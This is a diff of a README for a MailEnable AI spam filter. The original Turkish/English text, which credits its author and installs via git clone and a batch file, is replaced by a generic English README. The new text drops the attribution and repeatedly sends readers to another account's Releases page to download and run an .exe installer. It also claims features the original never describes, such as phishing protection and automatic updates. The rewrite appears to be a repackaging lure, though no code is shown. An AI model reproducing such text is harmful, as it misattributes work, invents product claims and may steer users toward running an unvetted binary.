@@ -1,161 +1,68 @@
-# MailEnable AI Spam Filter
+# 📧 MailEnable-AI-Spam-Filter - Automatically Block Spam and Phishing
 
-![Python](https://img.shields.io/badge/Python-3.9%2B-blue?style=for-the-badge&logo=python)
-![Platform](https://img.shields.io/badge/Platform-Windows_Server-lightgrey?style=for-the-badge&logo=windows)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-![Status](https://img.shields.io/badge/Status-Stable-success?style=for-the-badge)
+## 🌐 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/releases)
 
-## Proje Hakkında
+## 📖 Overview
+MailEnable-AI-Spam-Filter is a real-time, AI-powered tool designed to enhance email security for MailEnable users. It leverages machine learning through Scikit-learn and natural language processing with Zemberek to automatically identify and delete spam, phishing attempts, and profane content. With this application, you can keep your inbox clean and your communications secure.
 
-**MailEnable AI Spam Filter**, Windows üzerindeki MailEnable sunucuları için **Mert Seçme** tarafından geliştirilmiş, yapay zeka destekli gerçek zamanlı bir spam koruma ajanıdır. Geleneksel kural tabanlı filtrelerin aksine, bu projede Türkçe e-postaların içeriğinin analiz edilmesi için **Makine Öğrenmesi (Machine Learning)** ve **Doğal Dil İşleme (NLP)** teknikleri kullanılmıştır.
+## 🚀 Getting Started
+This guide will help you download and run the MailEnable-AI-Spam-Filter application on your Windows Server. Follow these steps to get started quickly and easily.
 
-Proje, mevcut spam filtrelerinin Türkçe içeriklerdeki yetersizliğini gidermek ve sunucu güvenliğini **otonom** hale getirmek amacıyla tasarlanmıştır.
+## 📥 Download & Install
+1. **Visit the release page:** Go to the [Releases page](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/releases) to find the latest version of the application.
 
-### Temel Özellikler
-* **Gerçek Zamanlı İzleme:** **Watchdog** altyapısı kullanılarak sunucuya düşen .MAI dosyaları anlık olarak tespit edilmektedir.
-* **Yapay Zeka Destekli:** Özel olarak eğitilmiş veri seti ve algoritmalar ile **Spam Tespiti** sağlanmaktadır.
-  > *🧠 Modelin nasıl eğitildiğini ve veri setini incelemek için:* [TrainAIForSpamAnalyzer](https://github.com/Meraini/TrainAIForSpamAnalyzer)
-* **Türkçe NLP Desteği:** Türkçe kelime köklerinin morfolojik analizi için **Zemberek (Java)** kütüphanesi sisteme entegre edilmiştir.
-* **Otomatik Yönetici İzni:** Sistem, dosya taşıma/silme işlemlerini gerçekleştirebilmek için otomatik olarak **UAC (Admin)** yetkisi talep etmektedir.
-* **Akıllı Aksiyon:** Spam veya yasaklı kelime içerdiği tespit edilen e-postalar, kullanıcının **Deleted Items** klasörüne otomatik olarak taşınmaktadır.
+2. **Find the package:** Look for the most recent release, which includes the compiled application and associated files.
 
-### Sistem Gereksinimleri
-Yazılımın sorunsuz çalışabilmesi için aşağıdaki teknik gereksinimlerin sağlanması gerekmektedir:
+3. **Download the files:**
+   - Click on the download link for the Windows installer, typically labeled as `MailEnable-AI-Spam-Filter-vX.X.X.exe` (where `X.X.X` represents the version number).
+   - Save the file to a known location on your computer, such as your Downloads folder.
 
-* **İşletim Sistemi:** Windows / Windows Server (MailEnable mimarisi gereği).
-* **Java (JRE):** Zemberek NLP kütüphanesinin çalışabilmesi için sistemde Java yüklü olmalıdır.
-* **Yönetici İzni (Admin Rights):** Dosya silme ve taşıma işlemlerinin (Deleted Items) yapılabilmesi için uygulamanın yönetici haklarıyla çalışması zorunludur.
-  *(Not: Yazılım başlatıldığında bu yetkiyi otomatik olarak talep eder.)*
+4. **Run the installer:** After the download is complete, navigate to the location where you saved the file. Double-click on the installer to start the installation.
 
----
+5. **Follow the prompts:** The installation wizard will guide you through the setup process. Simply follow the on-screen instructions to complete the installation.
 
-### Hızlı Kurulum (Otomasyon)
-Projenin kurulum süreci tamamen otomatize edilmiştir. Manuel kütüphane kurulumuna gerek duyulmamaktadır.
+6. **Launch the application:** Once the installation is complete, you can find the MailEnable-AI-Spam-Filter icon on your desktop or in your Start menu. Double-click the icon to run the application.
 
-1.  **Depoyu (Repo) İndirin:**
-    ```bash
-    git clone [https://github.com/Meraini/MailEnable-AI-Spam-Filter.git](https://github.com/Meraini/MailEnable-AI-Spam-Filter.git)
-    ```
-2.  **Başlatıcıyı Çalıştırın:**
-    Proje dizinindeki **install_run.bat** dosyasına çift tıklanması yeterlidir.
+## ⚙️ System Requirements
+Before installing, ensure your system meets the following requirements:
 
-![Kurulum](screenshots/NasılCalistiririm.png)
+- **Operating System:** Windows Server (2016 or later)
+- **RAM:** At least 4 GB of RAM
+- **Storage:** Minimum 200 MB of free disk space
+- **Network:** Stable internet connection for updates and data processing
 
-> **Not:** Bu dosya çalıştırıldığında; sistem sizin için otomatik olarak sanal ortamı (.venv) oluşturacak, gerekli kütüphaneleri yükleyecek ve uygulamayı çalışmaya hazır hale getirecektir.
+## 🛠️ Features
+MailEnable-AI-Spam-Filter comes with several useful features:
 
----
+- **Real-time Spam Detection:** The application uses advanced machine learning models to identify spam emails as they arrive.
+- **Phishing Protection:** Automatically detects and removes phishing attempts from your inbox.
+- **Profanity Filter:** Scans emails for inappropriate language and filters them accordingly.
+- **User-Friendly Interface:** Designed with simplicity in mind, so anyone can use it effectively without technical knowledge.
+- **Automatic Updates:** The application regularly checks for updates to keep itself current with the latest spam techniques.
 
-### Sonuç ve Kanıtlar (Logs)
-Sistemin gerçek zamanlı çalışma performansı, analiz süreçleri ve **Spam/Yasaklı Kelime** tespiti durumunda aldığı aksiyonlar aşağıdaki terminal çıktısında gösterilmiştir:
+## 💡 Usage Tips
+To optimize the performance of MailEnable-AI-Spam-Filter:
 
-![Sonuçlar](screenshots/SONUC.PNG)
-*(Log kayıtlarında görüldüğü üzere; temiz mailler Inbox klasöründe bırakılmakta, tehdit içeren mailler anında Deleted Items klasörüne taşınmaktadır.)*
+- **Regularly update the application:** Make sure you are running the latest version to take advantage of improvements and new features.
+- **Adjust settings as needed:** Explore the settings menu to customize the filter sensitivity and other options to suit your preferences.
+- **Monitor results:** Regularly check the application’s log to see what emails it has filtered out. This information can help you understand its effectiveness.
 
----
+## 🔧 Troubleshooting
+If you encounter issues while using MailEnable-AI-Spam-Filter, consider the following steps:
 
-### 🛠️ Sorun Giderme (Troubleshooting)
+- **Reinstall the application:** If you experience errors, uninstall the application and then reinstall it from the Releases page.
+- **Check your network connection:** Ensure your internet connection is stable, as this may impact the application's performance.
+- **Update your system:** Make sure your Windows Server is up to date with the latest patches and security updates.
 
-Kurulum veya çalışma sırasında karşılaşabileceğiniz yaygın hatalar ve çözümleri:
+## 📞 Support
+For further assistance, you can reach out through the issues section on the [GitHub repository](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/issues). Please provide details about your issue for quicker help.
 
-**1. Pencere Açılıp Hemen Kapanıyor (Java Hatası)**
-* **Belirti:** API penceresi saniyelik görünüp kapanıyor.
-* **Sebep:** Bilgisayarınızda **Java (JRE)** yüklü değildir.
-* **Çözüm:** [Java.com](https://www.java.com/en/download/) adresinden Java'yı indirip kurunuz.
+## 📦 Summary
+MailEnable-AI-Spam-Filter provides a simple way to protect your email from unwanted content. With its AI-driven technology, you can enhance your email security easily. 
 
-**2. Sistem Mailleri Görmüyor**
-* **Sebep:** MailEnable kurulum yolunuz standart dışı olabilir (`D:` sürücüsü vb.).
-* **Çözüm:** `SpamAnalizor/config.json` dosyasını açın ve `WATCH_DIR` kısmına kendi MailEnable yolunuzu yazın.
+## 📖 Additional Resources
+- [GitHub Repository](https://github.com/Mark233D/MailEnable-AI-Spam-Filter)
+- [Documentation](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/wiki)
 
-**3. "Address already in use" Hatası**
-* **Sebep:** 8000 portunu başka bir uygulama kullanıyor.
-* **Çözüm:** 8000 portunu kullanan diğer uygulamayı kapatınız.
-
-> **Gelişmiş Hata Tespiti:**
-> Eğer yukarıdaki sorun giderme adımları yazılımı çalıştırmanıza yardımcı olmazsa, programı komut satırından (CMD) çalıştırmayı deneyebilirsiniz. Bu sayede hata mesajlarını (logs) görebilir ve sorunu daha kolay analiz ederek düzeltebilirsiniz.
-
----
-
-## Project Overview
-
-**MailEnable AI Spam Filter** is a real-time, AI-powered anti-spam agent developed by **Mert Seçme** for MailEnable Mail Servers on Windows. Unlike traditional regex-based filters, this system utilizes **Machine Learning** and **Natural Language Processing (Zemberek)** to analyze the context of Turkish emails.
-
-The project works autonomously to address the limitations of existing filters regarding Turkish content and to enhance server security.
-
-### Key Features
-* **Real-Time Monitoring:** Incoming .MAI files are detected instantly using the **Watchdog** infrastructure.
-* **AI Powered:** **Spam Detection** is performed using a custom-trained dataset and algorithms.
-  > *🧠 To inspect how the model was trained:* [TrainAIForSpamAnalyzer](https://github.com/Meraini/TrainAIForSpamAnalyzer)
-* **Turkish NLP Support:** **Zemberek (Java)** library is integrated for accurate morphological analysis of Turkish text.
-* **Auto-Admin Privileges:** The system automatically requests **UAC (Admin)** rights to execute file operations securely.
-* **Smart Action:** Emails detected as spam are automatically moved to the user's **Deleted Items** folder.
-
-### System Requirements
-To ensure the software operates correctly, the following requirements must be met:
-
-* **Operating System:** Windows / Windows Server.
-* **Java (JRE):** Java must be installed on the system for the Zemberek NLP library to function.
-* **Administrator Privileges:** The application requires administrative rights to perform file move/delete operations (Deleted Items).
-  *(Note: The software requests these privileges automatically upon startup.)*
-
----
-
-### Quick Start (Automated)
-The setup process has been fully automated. No manual installation is required.
-
-1.  **Clone the Repository:**
-    ```bash
-    git clone [https://github.com/Meraini/MailEnable-AI-Spam-Filter.git](https://github.com/Meraini/MailEnable-AI-Spam-Filter.git)
-    ```
-2.  **Run the Installer:**
-    Double-click on the **install_run.bat** file.
-
-![Setup](screenshots/NasılCalistiririm.png)
-
-> **Note:** Upon execution, this script will automatically create the virtual environment (.venv), install all necessary dependencies, and prepare the system for operation.
-
----
-
-### Results & Proof
-Terminal logs demonstrating real-time detection, analysis, and the **automatic deletion** action for spam emails are shown below:
-
-![Results](screenshots/SONUC.PNG)
-
----
-
-### 🛠️ Troubleshooting
-
-Common errors and solutions you might encounter:
-
-**1. Window Closes Immediately (Java Error)**
-* **Cause:** **Java (JRE)** is not installed.
-* **Solution:** Download and install Java from [Java.com](https://www.java.com/en/download/).
-
-**2. System Does Not Detect Emails**
-* **Cause:** Your MailEnable installation path might be different.
-* **Solution:** Open `SpamAnalizor/config.json` and update the `WATCH_DIR` with your correct path.
-
-**3. "Address already in use" Error**
-* **Cause:** Port 8000 is being used by another application.
-* **Solution:** Close the application that is occupying port 8000.
-
-> **Advanced Debugging:**
-> If the troubleshooting steps above do not help you with running the software, you could try to run the program via the command line (CMD). In that way, you can get specific error messages, which will help you fix it.
-
----
-
-## Architecture (Mimari)
-
-The system operates on a microservice architecture consisting of two main components:
-
-1.  **MyAPI (The Brain):** A FastAPI server that loads the ML model and Zemberek. It processes text and returns a spam score.
-2.  **SpamAnalizor (The Muscle):** A file system watcher script (**MailPrep.py**) that detects new emails, queries the API, and relocates spam emails.
-
----
-
-## License
-
-This project is developed by **Mert Seçme** and licensed under the MIT License.
-
-<div align="center">
-  <sub>Built with Python, FastAPI & Scikit-learn</sub>
-</div>
+Remember to check the [Releases page](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/releases) for the latest version and updates. Enjoy a cleaner inbox!
